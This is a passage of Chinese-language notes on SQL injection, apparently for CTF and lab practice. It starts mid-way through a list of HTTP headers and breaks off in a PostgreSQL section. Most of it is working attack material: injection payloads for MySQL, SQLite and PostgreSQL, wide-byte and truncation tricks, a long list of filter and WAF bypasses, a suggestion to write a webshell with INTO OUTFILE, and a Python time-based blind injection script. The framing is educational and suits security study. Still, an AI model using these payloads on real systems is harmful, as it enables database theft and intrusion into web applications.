服务器表明自己对本响应消息体（不是消息体里面的对象）作了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding: chunked 30、Vary: WEB 服务器用该头部的内容告诉Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB 服务器在接到第一个请求消息时，其响应消息的头部为：Content- Encoding: gzip; Vary: Content-Encoding 那么Cache 服务器会分析后续请求消息的头部，检查其Accept-Encoding，是否跟先前响应的Vary 头部值一致，即是否使用相同的内容编码方法，这样就可以防止Cache 服务器用自己Cache 里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding 31、Via： 列出从客户端到OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添加Via 头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前个代理服务器的请求的Via 头部，并把自己的相关信息加到后面，以此类推，当OCS 收到最后一个代理服务器的请求时，检查Via 头部，就知道该请求所经过的路由。例如：Via：1.0 236.D0707195.sina.com.cn:80(squid/2.6.STABLE13)\n\n**sqli-labs/less18**\n\n从代码中看到\n\n```\n$insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent','$IP', $uname)\";\n```\n\n将useragent 和ip 插入到数据库中，那么我们是不是可以用这个来进行注入呢？\n\n将`user-agent` 修改为`'and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1;`\n\n## 基于程度和顺序的注入(哪里发生了影响)\n\n### 一阶注射\n\n### 二阶注射\n\n一阶注射是指输入的注射语句对WEB 直接产生了影响，出现了结果；二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB 应用程序产生影响，通过其它的辅助间接的对WEB 产生危害，这样的就被称为是二阶注入.\n\n**sqli-labs/Less-24**\n\n二次排序注入思路：\n\n1. 黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP 数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL 语句或者命令。\n2. 服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。\n3. 黑客向服务端发送第二个与第一次不相同的请求数据信息。\n4. 服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL 语句或者命令在服务端环境中执行。\n5. 服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。此例子中我们的步骤是注册一个admin’#的账号，接下来登录该帐号后进行修改密码。此时修改的就是admin 的密码。Sql 语句变为UPDATE users SET passwd=\"New_Pass\" WHERE username =' admin' # ' AND password=' ， 也就是执行了UPDATE users SET passwd=\"New_Pass\" WHERE username ='admin'\n\n步骤演示： （1）初始数据库为\n\n（2）注册admin’#账号\n\n注意此时的数据库中出现了admin’#的用户，同时admin 的密码为123\n\n（4）登录admin’#，并修改密码\n\n可以看到admin 的密码已经修改为1111\n\n## 服务器（两层）架构\n\n服务器端有两个部分：第一部分为tomcat 为引擎的jsp 型服务器，第二部分为apache为引擎的php 服务器，真正提供web 服务的是php 服务器。工作流程为：client 访问服务器，能直接访问到tomcat 服务器，然后tomcat 服务器再向apache 服务器请求数据。数据返回路径则相反。\n\n重点：index.php?id=1&id=2，你猜猜到底是显示id=1 的数据还是显示id=2 的？\n\nExplain：apache（php）解析最后一个参数，即显示id=2 的内容。Tomcat（jsp）解析第一个参数，即显示id=1 的内容。\n\n以上图片为大多数服务器对于参数解析的介绍。 此处我们想一个问题：index.jsp?id=1&id=2 请求，针对第一张图中的服务器配置情况，客户端请求首先过tomcat，tomcat 解析第一个参数，接下来tomcat 去请求apache（php）服务器，apache 解析最后一个参数。那最终返回客户端的应该是哪个参数？Answer：此处应该是id=2 的内容，应为时间上提供服务的是apache（php）服务器，返回的数据也应该是apache 处理的数据。而在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在tomcat 服务器处做数据过滤和处理，功能类似为一个WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过WAF 的检测。该用法就是HPP（HTTP Parameter Pollution），http 参数污染攻击的一个应用。HPP 可对服务器和客户端都能够造成一定的威胁。\n\n## 宽字节注入\n\n在了解宽字节注入之前，我们先来看一看字符集是什么。 字符集也叫字符编码，是一种将符号转换为二进制数的映射关系。 几种常见的字符集： `ASCII`编码：单字节编码 `latin1`编码：单字节编码 `gbk`编码：使用一字节和双字节编码，`0x00-0x7F`范围内是一位，和`ASCII` 保持一致。双字节的第一字节范围是`0x81-0xFE` `UTF-8`编码：使用一至四字节编码，`0x00–0x7F`范围内是一位，和`ASCII` 保持一致。其它字符用二至四个字节变长表示。\n\n宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。 通常来说，一个`gbk`编码汉字，占用2个字节。一个`utf-8`编码的汉字，占用3个字节。\n\n宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入。PHP的编码为UTF-8 而MySql的编码设置为了`SET NAMES 'gbk' `或是`SET character_set_client =gbk`，这样配置会引发编码转换从而导致的注入漏洞。\n\n```\n$conn->query(\"set names 'gbk';\");\n```\n\n### GBK编码\n\n```php\n<?php\n\n    $conn = mysqli_connect(\"127.0.0.1:3307\", \"root\", \"root\", \"db\");\n    if (!$conn) {\n        die(\"Connection failed: \" . mysqli_connect_error());\n    } $\n    conn->query(\"set names 'gbk';\");\n    $username = addslashes(@$_POST['username']);//非常安全的转义函数\n    $password = addslashes(@$_POST['password']);\n    $sql = \"select * from users where username = '$username' and password='$password';\";\n    $rs = mysqli_query($conn,$sql);\n    echo $sql.'<br>';\n    if($rs->fetch_row()){\n        echo \"success\";\n    }else{\n        echo \"fail\";\n} ?>\n用户名输入：admin' or 1=1#\n转义后为： admin\\' or 1=1#\n执行语句：... where username='admin\\' or 1=1#'\n\n用户名输入：admin%df' or 1=1#\n转义后为： admin%df\\' or 1=1#\nSET character_set_client ='gbk'后：admin運' or 1=1#\n执行语句：... where username='admin運' or 1=1#'\n```\n\n`%df` 吃掉`\\ `具体的原因是`urlencode(\\') `= `%5c%27`，我们在`%5c%27` 前面添加`%df`，形成`%df%5c%27`，而上面提到的mysql 在GBK 编码方式的，第一位范围为`0x00-0x7F`时，当作一个字符。`%df`不在这个范围内，因此会将两个字节当做一个汉字，此事`%df%5c` 就是一个汉字，`%27` 则作为一个单独的符号在外面，同时也就达到了我们的目的。\n\n### Latin1编码\n\n```php\n$mysqli = new mysqli( \"localhost\",\"root\",\"root\",\"cat\");\nif($mysqli->connect_errno){\n    printf(\"failed: %s\\n\", Smysqli->connect_error);\n    exit();\n}\n$mysqli->query(\"set names utf8\");\n$username= addslashes($_GET['username']);\n//我们在其基础上添加这么一条语句。\nif($username === 'admin'){\n    die(\"You can't do this\");\n}\n\n$sqL= \"SELECT * FROM `table1` WHERE username='{$username}'\";\nif($result = $mysqli->query($sql)){\n    printf(\"select returned %d rous.\\n\",$resule->num_rows);\n    while ($row = $result->fetch_ array(MYSQLI_ASSOC))\n    {\n        var_ dump($row);      \n    }\n    $resule->close();\n}else{\n    var_dump($mysqli->error);\n}\n$mysqli->close();\n?>\n```\n\nSQL语句会先转成`character_set_client`设置的编码。但他接下来还会继续转换。`character_set_client`客户端层转换完毕之后，数据将会交给`character_set_connection`连接层处理，最后在从`character_set_connection`转到数据表的内部操作字符集。\n\n字符集的转换为：`UTF-8—>UTF-8->Latin1`\n\nUTF-8编码是变长编码，可能有1~4个字节表示：\n\n• 一字节时范围是`[00-7F]` • 两字节时范围是`[C0-DF][80-BF]` • 三字节时范围是`[E0-EF][80-BF][80-BF]` • 四字节时范围是`[F0-F7][80-BF][80-BF`][80-BF] 然后根据`RFC 3629`规范，又有一些字节值是不允许出现在`UTF-8`编码中的：\n\n所以最终，UTF-8第一字节的取值范围是：`00-7F`、`C2-F4`。\n\n输入：`?username=admin%c2` 其中`%c2`是一个`Latin1`字符集不存在的字符。`%00-%7F`可以直接表示某个字符、`%C2-%F4`不可以直接表示某个字符而只是其他长字节编码结果的首字节。\n\n对于不完整的长字节UTF-8编码的字符，进行字符集转换时会直接忽略，所以`admin%c2`会变成`admin`\n\n## 约束攻击\n\n当数据库字符串长度过短，并且后端没有对字符串进行长度限制时\n\n```\nCREATE TABLE users(\n    username varchar(20),\n    password varchar(20)\n)\n```\n\n漏洞代码逻辑如下：\n\n代码由登录和注册构成。\n\n1.用`select * from table where username='$username'`检测你输入的用户名，如果存在，说明你注册过，那么不让你注册。\n\n2.用户名不存在，用`insert into table values('$username','$password')`把你输入的用户名密码插入数据库。\n\n`insert`和`select`语句执行不一样造成\n\n`INSERT`语句：截取前20个字符 `SELECT`语句：输入什么就是什么\n\n当我们注册时字符串长度超过20，那么使用`select`检测时就会不存在，那么就使用`insert`插入，这时候由于长度超过20，截取前20个字符。\n\n注册`admin a` -> `SELECT`认为不存在-> `INSERT`了前20位-> 使用自己注册的`admin`和对应密码进行登录~\n\n```\nINSERT插入了admin+15空格，实际上是插入了admin，末尾的空格会被MySQL忽略掉\n```\n\n这样就修改了`admin`的密码了\n\n## order by 后的injection\n\n### order by参数后注入\n\n从本关开始，我们开始学习order by 相关注入的知识。本关的sql 语句为$sql = \"SELECT * FROM users ORDER BY $id\";尝试?sort=1 desc 或者asc，显示结果不同，则表明可以注入。（升序or 降序排列）从上述的sql 语句中我们可以看出，我们的注入点在order by 后面的参数中，而order by不同于的我们在where 后的注入点，不能使用union 等进行注入。如何进行order by 的注入，我们先来了解一下mysql 官方select 的文档。\n\n```sql\nSELECT \n    [ALL | DISTINCT | DISTINCTROW ] \n      [HIGH_PRIORITY] \n      [STRAIGHT_JOIN] \n      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] \n      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] \n    select_expr [, select_expr ...] \n    [FROM table_references \n    [WHERE where_condition] \n    [GROUP BY {col_name | expr | position} \n      [ASC | DESC], ... [WITH ROLLUP]] \n    [HAVING where_condition] \n    [ORDER BY {col_name | expr | position} \n      [ASC | DESC], ...] \n    [LIMIT {[offset,] row_count | row_count OFFSET offset}] \n    [PROCEDURE procedure_name(argument_list)] \n    [INTO OUTFILE 'file_name' export_options \n      | INTO DUMPFILE 'file_name' \n      | INTO var_name [, var_name]] \n    [FOR UPDATE | LOCK IN SHARE MODE]]\n```\n\n我们可利用order by 后的一些参数进行注入。\n\n（1）、order by 后的数字可以作为一个注入点。也就是构造order by 后的一个语句，让该语句执行结果为一个数，我们尝试\n\n```\nhttp://127.0.0.1/sqli-labs/Less-46/?sort=right(version(),1)\n```\n\n没有报错，但是right 换成left 都一样，说明数字没有起作用，我们考虑布尔类型。此时我们可以用报错注入和延时注入。此处可以直接构造?sort= 后面的一个参数。此时，我们可以有三种形式，\n\n- 直接添加注入语句，?sort=(select ***\\***)\n- 利用一些函数。例如rand()函数等。?sort=rand(sql 语句) Ps：此处我们可以展示一下rand(ture)和rand(false)的结果是不一样的。\n\n```\nhttp://127.0.0.1/sqli-labs/Less-46/?sort=rand(false)\n```\n\n```\nhttp://127.0.0.1/sqli-labs/Less-46/?sort=rand(true\n```\n\n- 利用and，例如?sort=1 and (加sql 语句)。\n\n同时，sql 语句可以利用报错注入和延时注入的方式，语句我们可以很灵活的构造。\n\n```\nhttp://127.0.0.1/sqli-labs/Less-46/?sort=(select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))\n```\n\n接下来我们用rand()进行演示一下，因为上面提到rand(true)和rand(false)结果是不一样的。\n\n```\nhttp://127.0.0.1/sqli-labs/Less-46/?sort=rand(ascii(left(database(),1))=115)\nhttp://127.0.0.1/sqli-labs/Less-46/?sort=rand(ascii(left(database(),1))=116)\n从上述两个图的结果，对比rand(ture)和rand(false)的结果，可以看出报错注入是成功的。\n```\n\n延时注入例子\n\n```sql\nhttp://127.0.0.1/sqli-labs/Less-46/?sort= (SELECT IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,md5('1')),null) FROM (select database() as current) as tb1)\nhttp://127.0.0.1/sqli-labs/Less-46/?sort=1 and If(ascii(substr(database(),1,1))=116,0,sleep(5))\n```\n\n同时也可以用?sort=1 and 后添加注入语句。\n\n### procedure analyse 参数后注入\n\n此方法适用于MySQL 5.x中，在limit语句后面的注入\n\n利用procedure analyse 参数，我们可以执行报错注入。同时，在procedure analyse 和order by 之间可以存在limit 参数，我们在实际应用中，往往也可能会存在limit 后的注入，可以利用procedure analyse 进行注入。\n\n```sql\nhttp://127.0.0.1/sqli-labs/Less-46/?sort=1  procedure analyse(extractvalue(rand(),con\ncat(0x3a,version())),1)\n//SELECT field FROM user WHERE id >0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); \n如果不支持报错注入的话，还可以基于时间注入：\n//SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)\n```\n\n### 导入导出文件into outfile 参数\n\n```\nhttp://127.0.0.1/sqli-labs/Less-46/?sort=1 into outfile \"c:\\\\wamp\\\\www\\\\sqllib\\\\test\n1.txt\"\n将查询结果导入到文件当中\n那这个时候我们可以考虑上传网马，利用lines terminated by\nInto outtfile c:\\\\wamp\\\\www\\\\sqllib\\\\test1.txt lines terminated by 0x(网马进行16 进制转\n换)\n```\n\n## 绕过过滤\n\n### 空格被过滤\n\n```\n/**/替代空格\n%09 TAB 键（水平）\n%0a 新建一行\n%0c 新的一页\n%0d return 功能\n%0b TAB 键（垂直）\n%a0 空格\n() 代替空格，在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。\n```\n\n%a0�\n\n这个可算是一个不成汉字的中文字符了，那这应该就好理解了，因为%a0的特性，在进行正则匹配时，匹配到它时是识别为中文字符的，所以不会被过滤掉，但是在进入SQL语句后，Mysql是不认中文字符的，所以直接当作空格处理，就这样，我们便达成了Bypass的目的，成功绕过空格+注释的过滤\n\n### 过滤单引号\n\n当在登录时使用的是如下SQL语句：\n\n```\nselect user from user where user='$_POST[username]' and password='$_POST[password]';\n```\n\n在这里单引号被过滤了，但是反斜杠`\\`并没有被过滤。则单引号可以被转义\n\n输入的用户名以反斜杠`\\`结尾\n\n```\nusername=admin\\&password=123456#\n将这个拼接进去，\\就可以将第2个单引号转义掉\nselect * from users where username='admin\\' and password='123456#';\n这样第1个单引号就会找第3个单引号进行闭合，后台接收到的username实际上是admin\\' and password=这个整体\n接下来构造password为or 2>1#\nselect * from users where username='admin\\' and password=' or 2>1#';\n上面的语句会返回为真，通过这样的思路，我们就可以进行bool盲注\n```\n\n### 注释符\n\n```sql\n//\n--%20\n/**/\n#\n--+\n-- -\n%00\n;\n;%00\n;\\x00\n```\n\n### 大小写绕过\n\n### 双写绕过\n\n### 编码绕过\n\n利用urlencode，ascii(char)，hex，unicode等编码绕过\n\n```\nor 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。\n\n十六进制编码\n\nSELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))\n\n双重编码绕过\n\n?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+\n\n一些unicode编码举例：    \n单引号：'\n%u0027 %u02b9 %u02bc\n%u02c8 %u2032\n%uff07 %c0%27\n%c0%a7 %e0%80%a7\n空白：\n%u0020 %uff00\n%c0%20 %c0%a0 %e0%80%a0\n左括号(:\n%u0028 %uff08\n%c0%28 %c0%a8\n%e0%80%a8\n右括号):\n%u0029 %uff09\n%c0%29 %c0%a9\n%e0%80%a9\n```\n\n### like绕过\n\n```\n?id=1' or 1 like 1#\n可以绕过对 = > 等过滤\n```\n\n### in绕过\n\n```\nor '1' IN ('1234')#\n可以替代=\n```\n\n### 等价函数或变量\n\n```sql\nhex()、bin() ==> ascii()\n\nsleep() ==>benchmark()\n\nconcat_ws()==>group_concat()\n\nmid()、substr() ==> substring()\n\n@@user ==> user()\n\n@@datadir ==> datadir()\n\n举例：substring()和substr()无法使用时：?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74　\n\n或者：\nsubstr((select 'password'),1,1) = 0x70\nstrcmp(left('password',1), 0x69) = 1\nstrcmp(left('password',1), 0x70) = 0\nstrcmp(left('password',1), 0x71) = -1\n```\n\n### 反引号绕过\n\n```\nselect `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用\n```\n\n### 过滤union\n\n```\nwaf = 'and|or|union'\n过滤代码 union select user,password from users\n绕过方式 1 && (select user from users where userid=1)='admin'\n```\n\n### 过滤where\n\n```\nwaf = 'and|or|union|where'\n过滤代码 1 && (select user from users where user_id = 1) = 'admin'\n绕过方式 1 && (select user from users limit 1) = 'admin'\n```\n\n### 过滤limit\n\n```\nwaf = 'and|or|union|where|limit'\n过滤代码 1 && (select user from users limit 1) = 'admin'\n绕过方式 1 && (select user from users group by user_id having user_id = 1) = 'admin'#user_id聚合中user_id为1的user为admin\n```\n\n### 过滤group by\n\n```\nwaf = 'and|or|union|where|limit|group by'\n过滤代码 1 && (select user from users group by user_id having user_id = 1) = 'admin'\n绕过方式 1 && (select substr(group_concat(user_id),1,1) user from users ) = 1\n```\n\n### 过滤select\n\n```\nwaf = 'and|or|union|where|limit|group by|select'\n过滤代码 1 && (select substr(group_concat(user_id),1,1) user from users ) = 1\n只能查询本表中的数据\n绕过方式 1 && substr(user,1,1) = 'a'\n```\n\nmysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。\n\n```\nhandler users open as hd; #指定数据表进行载入并将返回句柄重命名\nhandler hd read first; #读取指定表/句柄的首行数据\nhandler hd read next; #读取指定表/句柄的下一行数据\nhandler hd close; #关闭句柄\n```\n\n### 过滤’(单引号)\n\n```\nwaf = 'and|or|union|where|limit|group by|select|\\''\n过滤代码 1 && substr(user,1,1) = 'a'\n绕过方式 1 && user_id is not null    1 && substr(user,1,1) = 0x61    1 && substr(user,1,1) = unhex(61)\n```\n\n### 过滤hex\n\n```sql\nwaf = 'and|or|union|where|limit|group by|select|\\'|hex'\n过滤代码 1 && substr(user,1,1) = unhex(61)\n绕过方式 1 && substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。\n```\n\n### 过滤substr\n\n```sql\nwaf = 'and|or|union|where|limit|group by|select|\\'|hex|substr'\n过滤代码 1 && substr(user,1,1) = lower(conv(11,10,16)) \n绕过方式 1 && lpad(user(),1,1) in 'r'\n```\n\n### 过滤`,`逗号\n\n```sql\n//过滤了逗号怎么办？就不能多个参数了吗？\nSELECT SUBSTR('2018-08-17',6,5);与SELECT SUBSTR('2018-08-17' FROM 6 FOR 5);\n意思相同\nsubstr支持这样的语法：\nSUBSTRING(str FROM pos FOR len)\nSUBSTRING(str FROM pos)\nMID()后续加入了这种写法\n```\n\n## 常用Payload总结\n\n```sql\n//联合查询\n//获取当前数据库的表名\n1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #\n//获取表中的字段名\n1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #\n//查询数据\n1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #\n//如果group_concat被过滤了，而又只能返回一条数据，则用limit 0,1\n\n//布尔盲注脚本\nimport requests as req\nimport time as t\nimport string\n\nurl = \"xxx\"\n\nselect = \"select group_concat(table_name) from information_schema.tables where binary table_schema in (select databases())\"\nselect = \"select group_concat(column_name) from information_schema.columns where binary table_name in ('xxxx') \"\nselect = \"select group_concat(xxxx) from xxxxxxx\"\nres = \"\"\n\ndef text2hex(s):\n    res = \"\"\n    for i in s:\n        res +=hex(ord(i)).replace(\"0x\", \"\")\n    return \"0x\" + res\n\nfor i in range(1,50):\n    for ascii in string.printable:\n        if ascii == '\\\\': #转义符号没有意义\n            continue\n        data = {\n            \"username\" : \"admin\",\n            \"password\" : f\"123' or if((binary right(({select},{i}) in ({text2hex(ascii+res)})),(select benchmark(15000000.sha1(sha(sha(1)))) in (0)),0)#\".replace(\" \", \"/**/\")\n        }\n        start = int(t.time())\n        r = req.post(url=url, data=data)\n        end = int(t.time()) - start\n        print(data)\n        if end > 4:\n            res = ascii +res\n            print(res)\n            break\n        if ascii == string.printable[-1:]:\n            exit(0)\n```\n\n# Sqlite注入\n\n## 注释符\n\n```sql\n/**/\n--\n两种注释符 --后面不带空格 \n```\n\n可以用于判断数据库类型\n\n`#`如果不生效的话则说明不是`mysql`\n\n## sqlite系统库\n\n```sql\n--先创建两个表\nCREATE TABLE GIFT(\nID INT PRIMARY KEY NOT NULL,\nITEM TEXT NOT NULL,\nLOG TEXT NOT NULL\n);\n\nCREATE TABLE SECRET(\nID INT NOT NULL,\nfl4ggg TEXT PRIMARY KEY NOT NULL\n);\n\nINSERT INTO GIFT (ID,ITEM,LOG) VALUES (1, \"Turkey\", \"Most British families like\nto cook their own turkey. A large number of vegetables and fruits, such as\nasparagus, celery, onions and chestnuts, are stuffed into the belly of a ten\npound turkey, and then coated with a variety of spices before being baked in\nthe oven.\");\nINSERT INTO SECRET (id,fl4ggg) VALUES (1, \"flag{Y1ng}\");\n```\n\n在`mysql`中查询库名、表名等有系统数据库`information_schema`，而在`sqlite`中则是表`sqlite_master`\n\n```sql\nsqlite> .schema sqlite_master\nCREATE TABLE sqlite_master (\n  type text,\n  name text,\n  tbl_name text,\n  rootpage integer,\n  sql text\n);\n```\n\n```sql\n--查询表名\nsqlite> SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';\nGIFT\nSECRET\n--注：这里之所以使用NOT like 'sqlite_%'，是避免出来系统的表，但是可能题目故意将表名弄成sqlite开头\n\n--查询列名\nsqlite> SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='GIFT';\nCREATE TABLE GIFT(\nID INT PRIMARY KEY NOT NULL,\nITEM TEXT NOT NULL,\nLOG TEXT NOT NULL\n)\nsqlite> SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='SECRET';\nCREATE TABLE SECRET(\nID INT NOT NULL,\nfl4ggg TEXT PRIMARY KEY NOT NULL\n)\n```\n\n## 字符串截取\n\n与`mysql`类似，`sqlite`中也有字符串截取的函数\n\n`substr()、substring()、like、=、>、<、in、between`，这些与`mysql`差不多\n\n而`sqlite`特有的\n\n**TRIM**\n\n```sql\nTRIM (字符串,要移除的字符) 如果要移除的字符不写，默认是空格\nLTRIM 字符串开头部分移除\nRTRIM 字符串结尾部分移除\n--这个函数与mysql中的TRIM用法不一样\n\nsqlite> select trim('aaaadsd','a');\ndsd\nsqlite> select trim('aaaadsda','a');\ndsd\n可以通过特定的trim构造，实现right()和left()的功能\nsqlite> select ltrim('casdasd','a') = ltrim(\"casdasd\",\"c\");\n0\n--通过ltrim去除字符与后一个trim判断相等，确定字符\n```\n\n**printf(FORMAT,...)**\n\n```sql\nsqlite> select printf('%.1s','aaaaa');\na\nsqlite> select printf('%.2s','aaaaa');\naa\nsqlite> select printf('%.3s','aaaaa');\naaa\n\n--通过printf函数格式化操作对字符串截取\n```\n\n通过`printf`判断长度\n\n```sql\n--如果printf('%.is', 'abc')=printf('%.i+1s', 'abc') 则说明字符串长度为i\n\nsqlite> select printf('%.5s','aaaaa') = printf('%.6s','aaaaa');\n1\n```\n\n## 比较\n\n**GLOB**\n\n运算符是用来匹配通配符指定模式的文本值。如果搜索表达式与模式表达式匹配，GLOB 运算符将返回1。与LIKE 运算符不同的是，**GLOB 是大小写敏感的**，对于下面的通配符，它遵循UNIX 的语法。\n\n- 星号`*`\n- 问号`?`\n- 星号`*`代表零个、一个或多个数字或字符。问号`?`代表一个单一的数字或字符。这些符号可以被组合使用。\n\n**LIKE**\n\n**LIKE** 运算符是用来匹配通配符指定模式的文本值。如果搜索表达式与模式表达式匹配，LIKE 运算符将返回真（true），也就是 1。这里有两个通配符与 LIKE 运算符一起使用\n\n- 百分号`%`\n- 下划线`_`\n- 百分号（%）代表零个、一个或多个数字或字符。下划线（_）代表一个单一的数字或字符。这些符号可以被组合使用。\n\n## 条件判断\n\n- `case when X then Y else Z end` 这个语句和`mysql`是相同的\n- `iif(X,Y,Z)`\n\n注意:\n\n1. `sqlite`中没有`if`语句\n2. `iif`只有`version>=3.32`可用\n\n```sql\nsqlite> select case when (1=1) then 1 else 0 end;\n1\nsqlite> select case when (1=2) then 1 else 0 end;\n0\n\n--iif函数使用的版本比较高\n```\n\n## 构造报错\n\n在`mysql`中可以使用`exp(999999)`报错，但是`sqlite`中没有\n\n在`sqlite`中使用`randomblob(N)`：返回`N-byte blob`\n\n```sql\nsqlite> select randomblob(1);\n\nsqlite> select randomblob(2);\n�`\nsqlite> select randomblob(3);\n~��\nsqlite> select randomblob(4);\n�2q�\n--随机返回N个字节的字符\n--转化为十六进制看看\nsqlite> select hex(randomblob(4));\nF8896FC0\n\n--当长度过长时报错\nsqlite> select randomblob(10000000000);\nError: string or blob too big\n```\n\n## 时间盲注sql\n\n`sqlite`中并没有`sleep()`这样的延时函数，通过`like`匹配和`RANDOMBLOB`组合延时\n\n```sql\n-- 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([秒]00000000/2))))\n\nsqlite> select 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))));\n0\n\n--虽然没有像sleep那样精确，但是也够用了\n```\n\n## SQLi-Quine\n\n在做CTF时可能遇见数据库里没有东西，但是却要求输入的与数据库查询的内容相等\n\n```sql\nrow = db.prepare(`select pw from users where id='admin' and pw='${user.pw}'`).get();\nif(typeof row !== \"undefined\"){\n    req.session.isAdmin = (row.pw === user.pw);\n}else{\n    req.session.isAdmin = false;\n}\n```\n\n上诉的`sql`语句要求输入的密码和查询的密码相等，在注入的过程中发现数据库没有东西。因此构造`payload`\n\n```sql\nPayload  :' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')--\n\nGenerates:' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||\n\nPayload  :' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--\nGenerates:' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--\n```\n\n```sql lite\nsqlite> select ''Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||');\n\n' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||\n\nsqlite> select '' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--\n   ...> ;\n\n' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--\n```\n\n参考题目：ASIS CTF Quals 2020 Admin Panel\n\n生成脚本参考：<https://www.shysecurity.com/post/20140705-SQLi-Quine>\n\n# PostgreSQL注入\n\n## 注释符\n\n```\n/**/\n--\n两种注释符 --后面不带空格 \n```\n\n判断是`plsql`还是`sqlite`\n\n```\n--可以注释，#不可注释，则不是mysql\n利用exp(999999)构造报错，可判断是PostgreSQL\n或者测试延时盲注利用pg_sleep()\npostgres=# select 123 where 123 = exp(9999999);\nERROR:  value out of range: overflow\n```\n\n## LIKE注入\n\n```sql\nstring LIKE pattern [ESCAPE escape-character]\nstring NOT LIKE pattern [ESCAPE escape-character]\n```\n\n在LIKE 子句中，通常与通配符结合使用，通配符表示任意字符，在PostgreSQL 中，主要有以下两种通配符（如果没有使用通配符，LIKE 子句和等号= 一样）：\n\n- 百分号`%`\n- 下划线`_`\n\n`_`匹配任意一个字符，`%`匹配0至多个任意字符。\n\n下面是 LIKE 语句中演示了 **%** 和 **_** 的一些差别:\n\n表格 还在加载中，请等待加载完成后再尝试复制\n\n在 PostgreSQL 中，LIKE 